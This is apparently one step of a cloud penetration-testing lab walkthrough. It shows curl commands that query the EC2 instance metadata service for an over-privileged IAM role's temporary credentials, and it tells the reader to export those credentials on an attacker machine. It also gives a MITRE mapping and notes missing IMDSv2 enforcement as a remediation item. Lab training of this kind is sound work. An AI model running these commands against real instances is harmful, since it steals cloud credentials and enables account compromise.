# Phase 6.3 — IAM Credential Theft via Instance Metadata (on the target, over SSH)

The EC2 instance has the over-privileged `EC2-App-Role-Legacy-*` role
attached. Any process on the box (including an attacker with shell access)
can pull temporary admin credentials from the Instance Metadata Service
(IMDS):

```bash
# List the role name
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Pull the actual temp credentials (replace ROLE_NAME with the output above)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```

This returns `AccessKeyId`, `SecretAccessKey`, and `Token`. Copy these —
you'll export them on your Kali attacker box in the next step.

**MITRE ATT&CK mapping:** T1552.005 — Unsecured Credentials: Cloud Instance
Metadata API. This is one of the single most common real-world cloud
incident patterns (e.g. the 2019 Capital One breach used this exact
technique via an SSRF).

**Finding for your report:** the role has no IMDSv2 enforcement
(`HttpTokens: optional`), which is what makes a simple `curl` enough —
IMDSv2 would require a session token, raising the bar for SSRF-based theft.
Note this as a remediation item.
